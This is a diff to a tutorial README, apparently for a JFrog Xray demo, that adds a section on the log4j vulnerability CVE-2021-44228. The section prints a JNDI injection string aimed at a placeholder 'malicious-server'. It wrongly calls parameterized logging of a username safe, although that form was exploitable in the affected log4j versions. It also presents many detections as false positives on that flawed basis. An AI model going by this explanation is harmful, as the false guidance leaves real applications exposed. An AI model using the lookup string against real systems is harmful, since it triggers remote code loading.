@@ -117,6 +117,27 @@ jf rt bp sample-maven-build 1
    - Builds: `sample-maven-build`
 3. Xray will now scan both the repository and your build for vulnerabilities, licenses, and compliance issues.
 
+### Understanding log4j Vulnerability in Your Project
+
+The log4j vulnerability (CVE-2021-44228) is detected in your project because it uses log4j-core version 2.14.0. However, it's important to understand that this vulnerability only becomes exploitable when:
+
+1. The vulnerable version of log4j is present in your project
+2. **AND** your application uses one of these specific logging patterns:
+   ```java
+   // Vulnerable pattern
+   logger.info("${jndi:ldap://malicious-server/exploit}");
+   
+   // Safe pattern
+   logger.info("User logged in: {}", username);
+   ```
+
+The vulnerability is triggered only when:
+- The application logs user-controlled input
+- The input contains the `${jndi:ldap://...}` pattern
+- The application has network access to the malicious server
+
+This is why Xray's advanced security analysis shows that many of the detected vulnerabilities are false positives - they exist in the code but are not actually exploitable in your specific use case.
+
 ---
 
 ## 🛡️ 9. Demonstrate and Remediate log4j Vulnerability
